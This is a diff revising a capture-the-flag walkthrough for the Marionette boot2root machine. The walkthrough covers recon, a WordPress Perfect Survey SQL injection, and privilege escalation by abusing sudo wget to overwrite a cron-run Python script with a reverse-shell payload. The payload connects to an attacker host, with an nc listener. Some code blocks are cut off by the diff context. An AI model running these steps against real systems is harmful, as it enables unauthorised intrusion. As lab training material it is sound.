@@ -1,8 +1,6 @@
 # Introduction
 Marionette is an easy boot2root CTF machine that mixes fantasy story telling, web application exploitation and a creative privilege scalation vector to hone your skills
 
-Identification of IP Address
-
 Use netdiscover to identify the target machine's IP address on your network:
 ```bash
 sudo netdiscover -r 10.10.10.0/24
@@ -15,7 +13,7 @@ Replace `10.10.10.0/24` with your network range (e.g., 192.168.0.1/24). This wil
 
 Start by running an nmap scan to identify open ports:
 ```bash
-nmap -T4 -sV
+nmap -T4 -sV <target>
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
@@ -24,13 +22,13 @@ MAC Address: 08:00:27:C0:EB:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Results show ports 22 (SSH) and 80 (HTTP) are open.
+Results show ports 22 (SSH) and 80 (HTTP) are open. Equipped with Wappalyzer and Basic Comprehension, it is evident that the target web application is running off a popular CMS called Wordpress.
 
-Visit the HTTP page in a browser. The site is running WordPress.
+Lets read all the blog posts and check for user comments, one of the user comments points to a hidden page, where we identify a custom plugin called Perfect survey
 
-Use wpscan to enumerate WordPress vulnerabilities:
+Use wpscan to list and verify the presence of above plugin:
 ```bash
-wpscan --url http://<target> --enumerate vp
+wpscan --url http://<target> --enumerate ap
 
 [+] perfect-survey
  | Location: http://10.10.10.15/wp-content/plugins/perfect-survey/
@@ -47,7 +45,7 @@ wpscan --url http://<target> --enumerate vp
  |  - http://10.10.10.15/wp-content/plugins/perfect-survey/readme.txt
 ```
 
-We have identified that the target is running Perfect Survey 1.5.1 which is vulnerable to Unauthenticated SQLi ([CVE-2021-24762](https://www.exploit-db.com/exploits/50766))
+We have identified that the target is running Wordpress Plugin Perfect Survey 1.5.1 which is vulnerable to Unauthenticated SQLi ([CVE-2021-24762](https://www.exploit-db.com/exploits/50766))
 
 # Foothold
 
@@ -73,7 +71,9 @@ Obtain credentials for the user `pinocchio` and use them to gain a shell on the 
 
 
 # Privilege Escalation
-As always, we start post exploitation enumeration by checking for unusual files, folders, permissions all over the box, we particularly come accross a python program in `/opt/workshop`, `ls -la /opt/workshop` will reveal that the file is being written every 5 minutes, perhaps it could also have been executing* in between the intervals?
+As always, we start our post exploitation enumeration by checking for unusual files, folders and permissions all over the box, we particularly come accross a python script in `/opt/workshop`.
+
+`ls -la /opt/workshop` will reveal that the script is being written every 5 minutes, perhaps it could also have been executing* in between the intervals?
 
 Before inspecting the file, let's go back to one of the important enumeration commands
 ```bash
@@ -82,13 +82,13 @@ sudo -l
 User pinocchio may run the following commands on marionette:
 (bluefairy) NOPASSWD: /usr/bin/wget
 ```
-> Interestingly, this makes more sense if you read the note left over by the blue fairy in pinocchio's home
+> Interestingly, this makes more sense if you read the note left over by the blue fairy inside pinocchio's home
 
 Let us now modify `/opt/workshop/workshop_utils.py` and gain a reverse shell; but unfortunately the file is only writable by bluefairy!
 
-Upon reading the manpage of wget; we get to know that we can overwrite a file using the -O command!
+Upon reading the man page of wget; we get to know that we can overwrite a file using the -O command!
 
-Open up two new tabs in your attack machine, prepare a malicious file `workshop_utils.py` with the following code
+Open up two new tabs in your attacker machine, prepare a malicious file `workshop_utils.py` with the following code
 
 
 ```python
@@ -102,12 +102,12 @@ def check_inventory():
 ```
 Replace `10.10.10.8` with your actual attacker's ip address, now save this file, start a listener with `nc -nlvp 4444`
 
-On a second tab, let's serve this file via python:
+On a new tab, let's serve this file via python:
 ```bash
 python3 -m http.server 8000
 ```
 
-On your ssh session as pinocchio@marionette; run the following commands to replace the workshop utility AS* the bluefairy
+On your ssh session as pinocchio@marionette; run the following commands to replace the workshop utility as* the bluefairy
 
 ```bash
 cd /opt/workshop
